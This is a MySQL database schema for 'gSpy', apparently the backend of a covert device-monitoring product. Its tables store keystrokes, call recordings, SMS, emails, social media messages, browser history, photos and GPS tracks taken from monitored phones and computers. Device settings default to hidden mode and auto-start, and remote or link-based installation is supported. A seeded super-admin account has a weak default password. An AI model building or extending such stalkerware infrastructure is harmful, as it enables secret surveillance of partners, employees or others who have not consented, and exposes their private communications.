-- gSpy MySQL Database Schema
-- This file contains all the necessary tables for gSpy monitoring system

-- Create database if not exists
CREATE DATABASE IF NOT EXISTS gspy_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE gspy_db;

-- Users table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    firstName VARCHAR(100) NOT NULL,
    lastName VARCHAR(100) NOT NULL,
    phone VARCHAR(20),
    role ENUM('user', 'admin', 'super_admin') DEFAULT 'user',
    subscription_plan ENUM('basic', 'premium', 'enterprise') DEFAULT 'basic',
    subscription_status ENUM('active', 'inactive', 'expired', 'cancelled') DEFAULT 'inactive',
    subscription_start_date DATETIME,
    subscription_end_date DATETIME,
    subscription_auto_renew BOOLEAN DEFAULT FALSE,
    notifications_email BOOLEAN DEFAULT TRUE,
    notifications_push BOOLEAN DEFAULT TRUE,
    notifications_sms BOOLEAN DEFAULT FALSE,
    privacy_data_retention INT DEFAULT 90,
    privacy_share_analytics BOOLEAN DEFAULT TRUE,
    language VARCHAR(10) DEFAULT 'en',
    timezone VARCHAR(50) DEFAULT 'UTC',
    is_active BOOLEAN DEFAULT TRUE,
    last_login DATETIME,
    login_attempts INT DEFAULT 0,
    lock_until DATETIME,
    email_verified BOOLEAN DEFAULT FALSE,
    email_verification_token VARCHAR(255),
    email_verification_expires DATETIME,
    password_reset_token VARCHAR(255),
    password_reset_expires DATETIME,
    two_factor_enabled BOOLEAN DEFAULT FALSE,
    two_factor_secret VARCHAR(255),
    api_key VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_email (email),
    INDEX idx_role (role),
    INDEX idx_subscription_status (subscription_status),
    INDEX idx_is_active (is_active)
);

-- Devices table
CREATE TABLE IF NOT EXISTS devices (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    device_id VARCHAR(255) UNIQUE NOT NULL,
    name VARCHAR(255) NOT NULL,
    type ENUM('android', 'ios', 'desktop', 'tablet') NOT NULL,
    platform VARCHAR(100) NOT NULL,
    version VARCHAR(50) NOT NULL,
    model VARCHAR(100),
    manufacturer VARCHAR(100),
    serial_number VARCHAR(255),
    imei VARCHAR(50),
    phone_number VARCHAR(20),
    status ENUM('active', 'inactive', 'offline', 'error') DEFAULT 'inactive',
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_sync DATETIME DEFAULT CURRENT_TIMESTAMP,
    sync_interval INT DEFAULT 300000,
    features_keylogger BOOLEAN DEFAULT FALSE,
    features_screen_recorder BOOLEAN DEFAULT FALSE,
    features_gps_tracking BOOLEAN DEFAULT FALSE,
    features_call_monitoring BOOLEAN DEFAULT FALSE,
    features_sms_monitoring BOOLEAN DEFAULT FALSE,
    features_call_recording BOOLEAN DEFAULT FALSE,
    features_live_screen BOOLEAN DEFAULT FALSE,
    features_social_media BOOLEAN DEFAULT FALSE,
    features_app_monitoring BOOLEAN DEFAULT FALSE,
    features_browser_history BOOLEAN DEFAULT FALSE,
    features_email_monitoring BOOLEAN DEFAULT FALSE,
    features_calendar_monitoring BOOLEAN DEFAULT FALSE,
    features_photo_monitoring BOOLEAN DEFAULT FALSE,
    features_video_monitoring BOOLEAN DEFAULT FALSE,
    features_geofencing BOOLEAN DEFAULT FALSE,
    features_keyword_alerts BOOLEAN DEFAULT FALSE,
    features_app_blocker BOOLEAN DEFAULT FALSE,
    features_remote_location BOOLEAN DEFAULT FALSE,
    permissions_location BOOLEAN DEFAULT FALSE,
    permissions_camera BOOLEAN DEFAULT FALSE,
    permissions_microphone BOOLEAN DEFAULT FALSE,
    permissions_storage BOOLEAN DEFAULT FALSE,
    permissions_contacts BOOLEAN DEFAULT FALSE,
    permissions_calendar BOOLEAN DEFAULT FALSE,
    permissions_phone BOOLEAN DEFAULT FALSE,
    permissions_sms BOOLEAN DEFAULT FALSE,
    permissions_accessibility BOOLEAN DEFAULT FALSE,
    permissions_overlay BOOLEAN DEFAULT FALSE,
    permissions_background BOOLEAN DEFAULT FALSE,
    settings_hidden_mode BOOLEAN DEFAULT TRUE,
    settings_auto_start BOOLEAN DEFAULT TRUE,
    settings_battery_optimization BOOLEAN DEFAULT FALSE,
    settings_data_limit INT DEFAULT 100,
    settings_data_warning INT DEFAULT 80,
    settings_storage_limit INT DEFAULT 1000,
    settings_storage_warning INT DEFAULT 80,
    network_wifi_ssid VARCHAR(255),
    network_wifi_bssid VARCHAR(255),
    network_wifi_strength INT,
    network_cellular_carrier VARCHAR(100),
    network_cellular_signal INT,
    network_cellular_type VARCHAR(50),
    network_ip VARCHAR(45),
    network_mac VARCHAR(17),
    battery_level INT,
    battery_is_charging BOOLEAN,
    battery_temperature DECIMAL(5,2),
    storage_total BIGINT,
    storage_used BIGINT,
    storage_available BIGINT,
    memory_total BIGINT,
    memory_used BIGINT,
    memory_available BIGINT,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    location_altitude DECIMAL(10,2),
    location_speed DECIMAL(10,2),
    location_heading DECIMAL(5,2),
    location_timestamp DATETIME,
    installation_method ENUM('manual', 'remote', 'link', 'qr') DEFAULT 'manual',
    installation_date DATETIME DEFAULT CURRENT_TIMESTAMP,
    installer VARCHAR(255),
    notes TEXT,
    encryption_key VARCHAR(255),
    device_token VARCHAR(255),
    last_auth DATETIME,
    auth_attempts INT DEFAULT 0,
    locked BOOLEAN DEFAULT FALSE,
    user_agent TEXT,
    screen_resolution VARCHAR(50),
    language VARCHAR(10),
    timezone VARCHAR(50),
    locale VARCHAR(10),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_status (status),
    INDEX idx_last_seen (last_seen)
);

-- Keylogger data table
CREATE TABLE IF NOT EXISTS keylogger_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    application_name VARCHAR(255),
    application_package VARCHAR(255),
    application_version VARCHAR(50),
    keystrokes JSON,
    text TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_timestamp (timestamp)
);

-- Call data table
CREATE TABLE IF NOT EXISTS call_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    call_id VARCHAR(255) UNIQUE NOT NULL,
    type ENUM('incoming', 'outgoing', 'missed', 'rejected') NOT NULL,
    phone_number VARCHAR(20) NOT NULL,
    contact_name VARCHAR(255),
    start_time DATETIME NOT NULL,
    end_time DATETIME,
    duration INT,
    recording_url VARCHAR(500),
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    network_type VARCHAR(50),
    carrier VARCHAR(100),
    notes TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_start_time (start_time),
    INDEX idx_phone_number (phone_number)
);

-- SMS data table
CREATE TABLE IF NOT EXISTS sms_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    sms_id VARCHAR(255) UNIQUE NOT NULL,
    type ENUM('incoming', 'outgoing') NOT NULL,
    phone_number VARCHAR(20) NOT NULL,
    contact_name VARCHAR(255),
    message TEXT NOT NULL,
    timestamp DATETIME NOT NULL,
    read BOOLEAN DEFAULT FALSE,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    network_type VARCHAR(50),
    carrier VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_timestamp (timestamp),
    INDEX idx_phone_number (phone_number)
);

-- Location data table
CREATE TABLE IF NOT EXISTS location_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    latitude DECIMAL(10,8) NOT NULL,
    longitude DECIMAL(11,8) NOT NULL,
    accuracy DECIMAL(10,2),
    altitude DECIMAL(10,2),
    speed DECIMAL(10,2),
    heading DECIMAL(5,2),
    address TEXT,
    city VARCHAR(100),
    state VARCHAR(100),
    country VARCHAR(100),
    postal_code VARCHAR(20),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_timestamp (timestamp),
    INDEX idx_location (latitude, longitude)
);

-- Social media data table
CREATE TABLE IF NOT EXISTS social_media_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    platform ENUM('facebook', 'instagram', 'twitter', 'whatsapp', 'telegram', 'snapchat', 'tiktok', 'youtube', 'linkedin', 'other') NOT NULL,
    action_type ENUM('post', 'message', 'comment', 'like', 'share', 'follow', 'upload', 'download', 'search', 'other') NOT NULL,
    content TEXT,
    url VARCHAR(500),
    contact_name VARCHAR(255),
    contact_phone VARCHAR(20),
    contact_email VARCHAR(255),
    media_files JSON,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_platform (platform),
    INDEX idx_timestamp (timestamp)
);

-- App usage data table
CREATE TABLE IF NOT EXISTS app_usage_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    app_name VARCHAR(255) NOT NULL,
    app_package VARCHAR(255) NOT NULL,
    app_version VARCHAR(50),
    start_time DATETIME NOT NULL,
    end_time DATETIME,
    duration INT,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_app_package (app_package),
    INDEX idx_start_time (start_time)
);

-- Browser history table
CREATE TABLE IF NOT EXISTS browser_history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    url VARCHAR(1000) NOT NULL,
    title VARCHAR(500),
    browser VARCHAR(100),
    visit_count INT DEFAULT 1,
    last_visit DATETIME NOT NULL,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_url (url(255)),
    INDEX idx_last_visit (last_visit)
);

-- Media files table
CREATE TABLE IF NOT EXISTS media_files (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    file_type ENUM('photo', 'video', 'screenshot', 'audio', 'document', 'other') NOT NULL,
    file_name VARCHAR(255) NOT NULL,
    file_path VARCHAR(500) NOT NULL,
    file_size BIGINT,
    mime_type VARCHAR(100),
    width INT,
    height INT,
    duration INT,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    metadata JSON,
    created_at DATETIME,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_file_type (file_type),
    INDEX idx_created_at (created_at)
);

-- Email data table
CREATE TABLE IF NOT EXISTS email_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    email_id VARCHAR(255) UNIQUE NOT NULL,
    from_address VARCHAR(255) NOT NULL,
    to_addresses JSON,
    cc_addresses JSON,
    bcc_addresses JSON,
    subject VARCHAR(500),
    body TEXT,
    attachments JSON,
    is_read BOOLEAN DEFAULT FALSE,
    is_sent BOOLEAN DEFAULT FALSE,
    sent_time DATETIME,
    received_time DATETIME,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_from_address (from_address),
    INDEX idx_sent_time (sent_time),
    INDEX idx_received_time (received_time)
);

-- Calendar events table
CREATE TABLE IF NOT EXISTS calendar_events (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    event_id VARCHAR(255) UNIQUE NOT NULL,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    start_time DATETIME NOT NULL,
    end_time DATETIME,
    location VARCHAR(500),
    attendees JSON,
    is_all_day BOOLEAN DEFAULT FALSE,
    reminder_time DATETIME,
    calendar_name VARCHAR(255),
    created_at DATETIME,
    updated_at DATETIME,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_start_time (start_time),
    INDEX idx_calendar_name (calendar_name)
);

-- Alerts table
CREATE TABLE IF NOT EXISTS alerts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    alert_type ENUM('keyword', 'location', 'app_usage', 'call', 'sms', 'email', 'geofence', 'battery', 'storage', 'network', 'other') NOT NULL,
    severity ENUM('low', 'medium', 'high', 'critical') DEFAULT 'medium',
    title VARCHAR(255) NOT NULL,
    message TEXT NOT NULL,
    data JSON,
    is_read BOOLEAN DEFAULT FALSE,
    is_resolved BOOLEAN DEFAULT FALSE,
    resolved_at DATETIME,
    location_latitude DECIMAL(10,8),
    location_longitude DECIMAL(11,8),
    location_accuracy DECIMAL(10,2),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_alert_type (alert_type),
    INDEX idx_severity (severity),
    INDEX idx_is_read (is_read),
    INDEX idx_timestamp (timestamp)
);

-- Analytics data table
CREATE TABLE IF NOT EXISTS analytics_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    metric_name VARCHAR(100) NOT NULL,
    metric_value DECIMAL(15,4) NOT NULL,
    metric_unit VARCHAR(50),
    category VARCHAR(100),
    subcategory VARCHAR(100),
    data JSON,
    date DATE NOT NULL,
    hour INT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_device_id (device_id),
    INDEX idx_user_id (user_id),
    INDEX idx_metric_name (metric_name),
    INDEX idx_date (date),
    INDEX idx_category (category)
);

-- Sessions table
CREATE TABLE IF NOT EXISTS sessions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    session_id VARCHAR(255) UNIQUE NOT NULL,
    ip_address VARCHAR(45),
    user_agent TEXT,
    device_info JSON,
    login_time DATETIME NOT NULL,
    logout_time DATETIME,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_user_id (user_id),
    INDEX idx_session_id (session_id),
    INDEX idx_is_active (is_active)
);

-- Create indexes for better performance
CREATE INDEX idx_users_created_at ON users(created_at);
CREATE INDEX idx_devices_created_at ON devices(created_at);
CREATE INDEX idx_keylogger_timestamp ON keylogger_data(timestamp);
CREATE INDEX idx_calls_start_time ON call_data(start_time);
CREATE INDEX idx_sms_timestamp ON sms_data(timestamp);
CREATE INDEX idx_location_timestamp ON location_data(timestamp);
CREATE INDEX idx_social_media_timestamp ON social_media_data(timestamp);
CREATE INDEX idx_app_usage_start_time ON app_usage_data(start_time);
CREATE INDEX idx_browser_last_visit ON browser_history(last_visit);
CREATE INDEX idx_media_created_at ON media_files(created_at);
CREATE INDEX idx_email_sent_time ON email_data(sent_time);
CREATE INDEX idx_calendar_start_time ON calendar_events(start_time);
CREATE INDEX idx_alerts_timestamp ON alerts(timestamp);
CREATE INDEX idx_analytics_date ON analytics_data(date);
CREATE INDEX idx_sessions_login_time ON sessions(login_time);

-- Insert default admin user (password: admin123)
INSERT INTO users (email, password, firstName, lastName, role, subscription_plan, subscription_status, is_active, email_verified) 
VALUES ('admin@gspy.com', '$2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj4J/HS.iK8i', 'Admin', 'User', 'super_admin', 'enterprise', 'active', TRUE, TRUE)
ON DUPLICATE KEY UPDATE id=id; 